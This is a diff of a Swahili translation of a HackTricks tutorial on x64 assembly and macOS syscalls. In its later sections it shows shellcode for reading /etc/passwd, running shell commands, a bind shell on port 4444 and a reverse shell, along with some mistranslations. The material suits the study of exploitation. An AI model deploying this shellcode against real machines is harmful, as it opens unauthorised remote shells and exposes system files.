@@ -1,86 +1,88 @@
-# Utangulizi wa x64
+# Introduction to x64
+
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>Jifunze AWS hacking kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-Njia nyingine za kusaidia HackTricks:
-
-* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA USAJILI**](https://github.com/sponsors/carlospolop)!
-* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
-* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa kipekee wa [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
-## **Utangulizi wa x64**
+## **Introduction to x64**
 
-x64, inayojulikana pia kama x86-64, ni usanifu wa processor wa biti 64 unaotumiwa sana katika kompyuta za mezani na seva. Ikitokana na usanifu wa x86 uliotengenezwa na Intel na baadaye kuchukuliwa na AMD kwa jina AMD64, ni usanifu unaotawala katika kompyuta za kibinafsi na seva leo.
+x64, pia inajulikana kama x86-64, ni usanifu wa processor wa 64-bit unaotumika hasa katika kompyuta za mezani na seva. Unatokana na usanifu wa x86 ulioandaliwa na Intel na baadaye kukubaliwa na AMD kwa jina AMD64, ni usanifu unaotumika sana katika kompyuta binafsi na seva leo.
 
-### **Vidhivyo**
+### **Registers**
 
-x64 inapanua usanifu wa x86, ikiwa na **registri 16 za matumizi ya jumla** zilizopewa majina `rax`, `rbx`, `rcx`, `rdx`, `rbp`, `rsp`, `rsi`, `rdi`, na `r8` hadi `r15`. Kila moja inaweza kuhifadhi thamani ya **biti 64** (baiti 8). Registri hizi pia zina sub-registri za biti 32, 16, na 8 kwa utangamano na kazi maalum.
+x64 inapanua usanifu wa x86, ikiwa na **registers 16 za kusudi la jumla** zilizo na lebo `rax`, `rbx`, `rcx`, `rdx`, `rbp`, `rsp`, `rsi`, `rdi`, na `r8` hadi `r15`. Kila moja ya hizi inaweza kuhifadhi **thamani ya 64-bit** (byte 8). Registers hizi pia zina sub-registers za 32-bit, 16-bit, na 8-bit kwa ajili ya ufanisi na kazi maalum.
 
-1. **`rax`** - Mara nyingi hutumiwa kwa **thamani za kurudi** kutoka kwa kazi.
-2. **`rbx`** - Mara nyingi hutumiwa kama **registri ya msingi** kwa operesheni za kumbukumbu.
-3. **`rcx`** - Mara nyingi hutumiwa kama **kikokotozi cha mzunguko**.
-4. **`rdx`** - Hutumiwa katika majukumu mbalimbali ikiwa ni pamoja na operesheni za hesabu za muda mrefu.
-5. **`rbp`** - **Mnogeshaji wa msingi** kwa fremu ya steki.
-6. **`rsp`** - **Mnogeshaji wa steki**, ukiweka rekodi ya juu ya steki.
-7. **`rsi`** na **`rdi`** - Hutumiwa kama **vyanzo** na **marudio** ya viashiria katika operesheni za herufi/kumbukumbu.
-8. **`r8`** hadi **`r15`** - Registri za matumizi ya jumla zilizoongezwa katika x64.
+1. **`rax`** - Kawaida hutumika kwa **thamani za kurudi** kutoka kwa kazi.
+2. **`rbx`** - Mara nyingi hutumika kama **register ya msingi** kwa operesheni za kumbukumbu.
+3. **`rcx`** - Kawaida hutumika kwa **hesabu za mzunguko**.
+4. **`rdx`** - Hutumika katika majukumu mbalimbali ikiwa ni pamoja na operesheni za hesabu za ziada.
+5. **`rbp`** - **Pointer ya msingi** kwa fremu ya stack.
+6. **`rsp`** - **Pointer ya stack**, ikifuatilia kilele cha stack.
+7. **`rsi`** na **`rdi`** - Hutumika kwa **vigezo** vya **chanzo** na **kikundi** katika operesheni za nyuzi/kumbukumbu.
+8. **`r8`** hadi **`r15`** - Registers za ziada za kusudi la jumla zilizoanzishwa katika x64.
 
-### **Mfumo wa Kuita**
+### **Calling Convention**
 
-Mfumo wa kuita wa x64 hutofautiana kati ya mifumo ya uendeshaji. Kwa mfano:
+Mkataba wa wito wa x64 unatofautiana kati ya mifumo ya uendeshaji. Kwa mfano:
 
-* **Windows**: **Parameta nne za kwanza** zinapitishwa katika registri **`rcx`**, **`rdx`**, **`r8`**, na **`r9`**. Parameta zaidi hupigwa kwenye steki. Thamani ya kurudi iko katika **`rax`**.
-* **System V (inayotumiwa kawaida katika mifumo inayofanana na UNIX)**: **Parameta sita za nambari au viashiria** zinapitishwa katika registri **`rdi`**, **`rsi`**, **`rdx`**, **`rcx`**, **`r8`**, na **`r9`**. Thamani ya kurudi pia iko katika **`rax`**.
+* **Windows**: Vigezo **vinne vya kwanza** vinapitishwa katika registers **`rcx`**, **`rdx`**, **`r8`**, na **`r9`**. Vigezo zaidi vinasukumwa kwenye stack. Thamani ya kurudi iko katika **`rax`**.
+* **System V (inayotumika sana katika mifumo kama UNIX)**: Vigezo **sita vya kwanza vya nambari au pointer** vinapitishwa katika registers **`rdi`**, **`rsi`**, **`rdx`**, **`rcx`**, **`r8`**, na **`r9`**. Thamani ya kurudi pia iko katika **`rax`**.
 
-Ikiwa kazi ina zaidi ya viingizo sita, **vengine vitapitishwa kwenye steki**. **RSP**, mnogeshaji wa steki, lazima uwe **umepangishwa kwa baiti 16**, maana anwani inayolenga lazima igawanywe na 16 kabla ya wito wowote kufanyika. Hii inamaanisha kwamba kawaida tunahitaji kuhakikisha kwamba RSP imepangishwa vizuri katika shellcode yetu kabla ya kufanya wito wa kazi. Hata hivyo, kwa vitendo, wito wa mfumo hufanya kazi mara nyingi hata kama mahitaji haya hayakidhi.
+Ikiwa kazi ina zaidi ya ingizo sita, **zingine zitapitishwa kwenye stack**. **RSP**, pointer ya stack, inapaswa kuwa **imepangwa kwa byte 16**, ambayo inamaanisha kwamba anwani inayoelekeza inapaswa kugawanywa kwa 16 kabla ya wito wowote kutokea. Hii inamaanisha kwamba kawaida tunahitaji kuhakikisha kuwa RSP imepangwa ipasavyo katika shellcode yetu kabla ya kufanya wito wa kazi. Hata hivyo, katika mazoezi, wito wa mfumo unafanya kazi mara nyingi hata kama hitaji hili halijakidhi.
 
-### Mfumo wa Kuita katika Swift
+### Calling Convention in Swift
 
-Swift ina **mfumo wake wa kuita** ambao unaweza kupatikana katika [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64)
+Swift ina **mkataba wa wito** wake ambao unaweza kupatikana katika [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64)
 
-### **Maagizo ya Kawaida**
+### **Common Instructions**
 
-Maagizo ya x64 yana seti tajiri, yakihifadhi utangamano na maagizo ya awali ya x86 na kuingiza mapya.
+Maagizo ya x64 yana seti tajiri, yakihifadhi ufanisi na maagizo ya awali ya x86 na kuanzisha mapya.
 
-* **`mov`**: **Hamisha** thamani kutoka kwa **registri** au **eneo la kumbukumbu** kwenda lingine.
-* Mfano: `mov rax, rbx` — Inahamisha thamani kutoka `rbx` kwenda `rax`.
-* **`push`** na **`pop`**: Piga au toa thamani kwa/ kutoka kwa **steki**.
-* Mfano: `push rax` — Inapiga thamani katika `rax` kwenye steki.
-* Mfano: `pop rax` — Inatoa thamani ya juu kutoka kwenye steki kwenda `rax`.
+* **`mov`**: **Hamisha** thamani kutoka **register** moja au **mahali pa kumbukumbu** hadi nyingine.
+* Mfano: `mov rax, rbx` — Hamisha thamani kutoka `rbx` hadi `rax`.
+* **`push`** na **`pop`**: Sukuma au panda thamani kutoka/kwenda kwenye **stack**.
+* Mfano: `push rax` — Inasukuma thamani katika `rax` kwenye stack.
+* Mfano: `pop rax` — Inapanda thamani ya juu kutoka kwenye stack hadi `rax`.
 * **`add`** na **`sub`**: Operesheni za **kuongeza** na **kupunguza**.
 * Mfano: `add rax, rcx` — Inaongeza thamani katika `rax` na `rcx` ikihifadhi matokeo katika `rax`.
-* **`mul`** na **`div`**: Operesheni za **kuzidisha** na **kugawanya**. Kumbuka: hizi zina tabia maalum kuhusu matumizi ya mizani.
-* **`call`** na **`ret`**: Hutumiwa kwa **kuita** na **kurudi kutoka kwa kazi**.
-* **`int`**: Hutumiwa kuanzisha **kizuizi cha programu**. K.m., `int 0x80` ilikuwa ikitumika kwa wito wa mfumo katika x86 Linux ya biti 32.
-* **`cmp`**: **Linganisha** thamani mbili na weka bendera za CPU kulingana na matokeo.
-* Mfano: `cmp rax, rdx` — Inalinganisha `rax` na `rdx`.
-* **`je`, `jne`, `jl`, `jge`, ...**: Maagizo ya **kuruka kwa sharti** ambayo hubadilisha mtiririko wa udhibiti kulingana na matokeo ya `cmp` au jaribio la awali.
-* Mfano: Baada ya maagizo ya `cmp rax, rdx`, `je label` — Inaruka kwenye `label` ikiwa `rax` ni sawa na `rdx`.
-* **`syscall`**: Hutumiwa kwa **wito wa mfumo** katika baadhi ya mifumo ya x64 (kama vile Unix ya kisasa).
-* **`sysenter`**: Maagizo ya **wito wa mfumo** ulioimarishwa kwenye majukwaa fulani.
+* **`mul`** na **`div`**: Operesheni za **kuongeza** na **ugawaji**. Kumbuka: hizi zina tabia maalum kuhusu matumizi ya operandi.
+* **`call`** na **`ret`**: Inatumika kufanya **wito** na **kurudi kutoka kwa kazi**.
+* **`int`**: Inatumika kuanzisha **interrupt** ya programu. Mfano: `int 0x80` ilitumika kwa wito wa mfumo katika 32-bit x86 Linux.
+* **`cmp`**: **Linganisha** thamani mbili na kuweka bendera za CPU kulingana na matokeo.
+* Mfano: `cmp rax, rdx` — Linganisha `rax` na `rdx`.
+* **`je`, `jne`, `jl`, `jge`, ...**: Maagizo ya **kuruka kwa masharti** yanayobadilisha mtiririko wa udhibiti kulingana na matokeo ya `cmp` au jaribio la awali.
+* Mfano: Baada ya maagizo ya `cmp rax, rdx`, `je label` — Inaruka hadi `label` ikiwa `rax` ni sawa na `rdx`.
+* **`syscall`**: Inatumika kwa **wito wa mfumo** katika mifumo mingine ya x64 (kama Unix za kisasa).
+* **`sysenter`**: Amri ya **wito wa mfumo** iliyoboreshwa kwenye baadhi ya majukwaa.
 
-### **Prologi ya Kazi**
+### **Function Prologue**
 
-1. **Piga mnogeshaji wa msingi wa zamani**: `push rbp` (huhifadhi mnogeshaji wa msingi wa mpigaji)
-2. **Hamisha mnogeshaji wa steki ya sasa kwenda kwa mnogeshaji wa msingi**: `mov rbp, rsp` (inaweka mnogeshaji wa msingi mpya kwa kazi ya sasa)
-3. **Tenga nafasi kwenye steki kwa mchanganyiko wa ndani**: `sub rsp, <ukubwa>` (ambapo `<ukubwa>` ni idadi ya baiti inayohitajika)
+1. **Sukuma pointer ya zamani ya msingi**: `push rbp` (huhifadhi pointer ya msingi ya mwitishaji)
+2. **Hamisha pointer ya sasa ya stack hadi pointer ya msingi**: `mov rbp, rsp` (inasanifisha pointer mpya ya msingi kwa kazi ya sasa)
+3. **Panga nafasi kwenye stack kwa ajili ya vigezo vya ndani**: `sub rsp, <size>` (ambapo `<size>` ni idadi ya byte zinazohitajika)
 
-### **Epilogi ya Kazi**
+### **Function Epilogue**
 
-1. **Hamisha mnogeshaji wa sasa wa msingi kwenda kwa mnogeshaji wa steki**: `mov rsp, rbp` (hufuta mchanganyiko wa ndani)
-2. **Toa mnogeshaji wa zamani wa msingi kutoka kwenye steki**: `pop rbp` (inarejesha mnogeshaji wa msingi wa mpigaji)
-3. **Rudi**: `ret` (inarudisha udhibiti kwa mpigaji)
+1. **Hamisha pointer ya sasa ya msingi hadi pointer ya stack**: `mov rsp, rbp` (ondoa vigezo vya ndani)
+2. **Panda pointer ya zamani ya msingi kutoka kwenye stack**: `pop rbp` (rejesha pointer ya msingi ya mwitishaji)
+3. **Rudi**: `ret` (rejesha udhibiti kwa mwitishaji)
+
 ## macOS
 
 ### syscalls
 
-Kuna madarasa tofauti ya syscalls, unaweza [**kuzipata hapa**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/osfmk/mach/i386/syscall\_sw.h)**:**
+Kuna makundi tofauti ya syscalls, unaweza [**kuzipata hapa**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/osfmk/mach/i386/syscall\_sw.h)**:**
 ```c
 #define SYSCALL_CLASS_NONE	0	/* Invalid */
 #define SYSCALL_CLASS_MACH	1	/* Mach */
@@ -89,7 +91,7 @@ Kuna madarasa tofauti ya syscalls, unaweza [**kuzipata hapa**](https://opensourc
 #define SYSCALL_CLASS_DIAG	4	/* Diagnostics */
 #define SYSCALL_CLASS_IPC	5	/* Mach IPC */
 ```
-Kisha, unaweza kupata nambari ya syscall kila [**katika url hii**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)**:**
+Kisha, unaweza kupata kila nambari ya syscall [**katika url hii**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)**:**
 ```c
 0	AUE_NULL	ALL	{ int nosys(void); }   { indirect syscall }
 1	AUE_EXIT	ALL	{ void exit(int rval); }
@@ -106,13 +108,13 @@ Kisha, unaweza kupata nambari ya syscall kila [**katika url hii**](https://opens
 12	AUE_CHDIR	ALL	{ int chdir(user_addr_t path); }
 [...]
 ```
-Kwa hivyo ili kuita `open` syscall (**5**) kutoka darasa la **Unix/BSD** unahitaji kuongeza: `0x2000000`
+Ili kuita syscall `open` (**5**) kutoka **Unix/BSD class** unahitaji kuiongeza: `0x2000000`
 
-Kwa hivyo, nambari ya syscall ya kuita open itakuwa `0x2000005`
+Hivyo, nambari ya syscall ya kuita open itakuwa `0x2000005`
 
 ### Shellcodes
 
-Kukusanya:
+Ili kukusanya: 
 
 {% code overflow="wrap" %}
 ```bash
@@ -121,7 +123,7 @@ ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/Comm
 ```
 {% endcode %}
 
-Kuondoa baits:
+Ili kutoa bytes:
 
 {% code overflow="wrap" %}
 ```bash
@@ -137,7 +139,7 @@ otool -t shell.o | grep 00 | cut -f2 -d$'\t' | sed 's/ /\\x/g' | sed 's/^/\\x/g'
 
 <details>
 
-<summary>Msimbo wa C kufanya majaribio ya shellcode</summary>
+<summary>Code ya C ya kujaribu shellcode</summary>
 ```c
 // code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
 // gcc loader.c -o loader
@@ -226,9 +228,9 @@ syscall
 {% endtab %}
 {% endtabs %}
 
-#### Soma na cat
+#### Soma kwa cat
 
-Lengo ni kutekeleza `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, hivyo hoja ya pili (x1) ni mfululizo wa vigezo (ambavyo kumbukumbu zake ni rundo la anwani).
+Lengo ni kutekeleza `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, hivyo hoja ya pili (x1) ni safu ya paramu (ambazo katika kumbukumbu zinamaanisha stack ya anwani).
 ```armasm
 bits 64
 section .text
@@ -259,7 +261,7 @@ section .data
 cat_path:      db "/bin/cat", 0
 passwd_path:   db "/etc/passwd", 0
 ```
-#### Kuita amri na sh
+#### Wito amri na sh
 ```armasm
 bits 64
 section .text
@@ -297,9 +299,9 @@ sh_path:        db "/bin/sh", 0
 sh_c_option:    db "-c", 0
 touch_command:  db "touch /tmp/lalala", 0
 ```
-#### Kifungu cha Bind
+#### Bind shell
 
-Kifungu cha Bind kutoka [https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html](https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html) kwenye **bandari 4444**
+Bind shell kutoka [https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html](https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html) katika **bandari 4444**
 ```armasm
 section .text
 global _main
@@ -374,9 +376,9 @@ mov  rax, r8
 mov  al, 0x3b
 syscall
 ```
-#### Kifaa cha Kugeuza Shell
+#### Reverse Shell
 
-Kifaa cha kugeuza shell kutoka [https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html](https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html). Kifaa cha kugeuza shell kwenda **127.0.0.1:4444**
+Reverse shell kutoka [https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html](https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html). Reverse shell kwa **127.0.0.1:4444**
 ```armasm
 section .text
 global _main
@@ -438,16 +440,17 @@ mov  rax, r8
 mov  al, 0x3b
 syscall
 ```
+{% hint style="success" %}
+Jifunze na fanya mazoezi ya AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Jifunze na fanya mazoezi ya GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Jifunze AWS hacking kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-Njia nyingine za kusaidia HackTricks:
-
-* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA USAJILI**](https://github.com/sponsors/carlospolop)!
-* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
-* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa kipekee wa [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Shiriki mbinu zako za kuhack kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
+* Angalia [**mpango wa usajili**](https://github.com/sponsors/carlospolop)!
+* **Jiunge na** 💬 [**kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuatilie** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Shiriki mbinu za hacking kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
 
 </details>
+{% endhint %}
